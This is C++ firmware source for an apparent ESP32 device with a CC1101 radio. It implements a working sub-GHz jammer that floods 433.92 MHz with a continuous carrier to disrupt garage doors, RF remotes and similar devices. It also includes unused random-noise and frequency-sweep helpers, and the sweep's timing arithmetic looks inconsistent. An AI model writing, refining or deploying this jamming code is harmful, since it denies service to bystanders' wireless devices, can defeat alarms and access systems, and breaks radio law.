#include "subghz_jammer_suite.h"
#include "tx_arm.h"
#include "config.h"
#include <RadioLib.h>

namespace {
Module cc1101Module(PIN_CC1101_CS, PIN_CC1101_GDO0, RADIOLIB_NC, PIN_CC1101_GDO2, SPI);
CC1101 radio(&cc1101Module);
volatile bool g_jamActive = false;
uint32_t g_jamCount = 0;
bool g_radioInitialized = false;

int initCC1101(float freq) {
    if (!g_radioInitialized) {
        int state = radio.begin(freq);
        if (state != RADIOLIB_ERR_NONE) {
            Serial.printf("CC1101 init failed: %d\n", state);
            return state;
        }

        radio.setOOK(true);
        radio.setRxBandwidth(58.0f);
        radio.setBitRate(4.8f);
        g_radioInitialized = true;
    }

    radio.setFrequency(freq);
    return RADIOLIB_ERR_NONE;
}

void sendJamCarrier(float freq, uint32_t durationUs) {
    if (initCC1101(freq) != RADIOLIB_ERR_NONE) return;

    radio.transmitDirect();
    delayMicroseconds(durationUs);
    radio.standby();
    g_jamCount++;
}

void sendRandomNoise(float freq) {
    if (initCC1101(freq) != RADIOLIB_ERR_NONE) return;

    uint8_t jamData[64];
    for (int i = 0; i < 64; i++) {
        jamData[i] = esp_random() & 0xFF;
    }

    radio.transmit(jamData, 64);
    delayMicroseconds(500);
    g_jamCount++;
}

void sweepFrequency(float startFreq, float endFreq, uint32_t sweepTimeMs) {
    uint32_t steps = (endFreq - startFreq) * 100;
    float stepSize = (endFreq - startFreq) / steps;
    uint32_t delayPerStep = sweepTimeMs / steps;

    for (uint32_t i = 0; i < steps; i++) {
        float freq = startFreq + (stepSize * i);
        initCC1101(freq);
        radio.transmitDirect();
        delay(delayPerStep / 1000);
        if (delayPerStep % 1000) delayMicroseconds(delayPerStep % 1000);
        radio.standby();
        g_jamCount++;
    }
}
}

namespace SubghzJammerSuite {

JamResult jamSubghzDevices(uint32_t durationMs) {
    JamResult result{false, 0, durationMs};

    Serial.println("\n=== Sub-GHz Jammer Suite (REAL CC1101) ===");
    Serial.println("Frequency: 433.92 MHz (ISM Band)");
    Serial.println("Duration: " + String(durationMs) + "ms");
    Serial.println("Modulation: OOK (On-Off Keying)");
    Serial.println("Power: Max (+10 dBm)");

    if (!TxArm::isArmed()) {
        Serial.println("✗ TX not armed (hold BACK button)");
        return result;
    }

    g_radioInitialized = false;
    g_jamActive = true;
    g_jamCount = 0;
    uint32_t startTime = millis();

    if (initCC1101(433.92f) != RADIOLIB_ERR_NONE) {
        Serial.println("✗ CC1101 initialization failed");
        g_jamActive = false;
        return result;
    }

    Serial.println("Transmitting Sub-GHz jamming signal...");

    while (millis() - startTime < durationMs && g_jamActive && TxArm::isArmed()) {
        // Send jam carrier signal
        sendJamCarrier(433.92f, 1000);

        delay(5);

        if (g_jamCount % 20 == 0) {
            Serial.printf("  [%u] jam transmissions in %lums\n",
                         g_jamCount, millis() - startTime);
        }
    }

    g_jamActive = false;
    radio.standby();
    result.success = true;
    result.jamPacketsCount = g_jamCount;

    uint32_t elapsed = millis() - startTime;
    Serial.printf("✓ Sub-GHz jamming complete: %u transmissions in %lums\n",
                 result.jamPacketsCount, elapsed);
    Serial.println("⚠️  433.92 MHz ISM band disrupted (garage doors, RF remotes, etc.)");

    return result;
}

void stop() {
    g_jamActive = false;
    if (g_radioInitialized) {
        radio.standby();
    }
}

bool isActive() {
    return g_jamActive;
}

}  // namespace SubghzJammerSuite
